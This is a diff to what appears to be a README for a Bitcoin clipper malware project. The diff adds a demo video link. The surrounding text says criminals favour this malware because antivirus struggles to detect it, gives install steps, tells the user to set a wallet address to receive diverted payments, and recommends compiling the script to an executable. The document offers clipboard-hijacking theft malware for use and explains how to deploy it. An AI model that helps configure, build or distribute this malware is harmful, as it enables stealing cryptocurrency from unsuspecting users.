@@ -7,6 +7,9 @@ Bitcoin Clipper malware is a type of malware that waits until a user copies a Bi
 
 CyberCriminals use this type of malware because it is hard to detect by anti-virus as it is not doing anything but checking and changing the content on the users clipboard. However this allows CyberCriminals to make money without users realising to fast.  
 
+## Bitcoin Clipper in Action
+https://user-images.githubusercontent.com/122122838/227795874-2fe82ccc-98fd-416d-89b1-0c5149b7c094.mp4
+
 ## Installation
 Download the project files then follow the instructions below.
 
@@ -21,7 +24,6 @@ Open clipper.py and change **switch_address** to your bitcoin address.
 switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
 ```
 
-    
 ## Run the program
 I recommend that you compile it to an exe which you can find a tutorial for online however if you just wanna run it on your PC do the following:
 ```bash
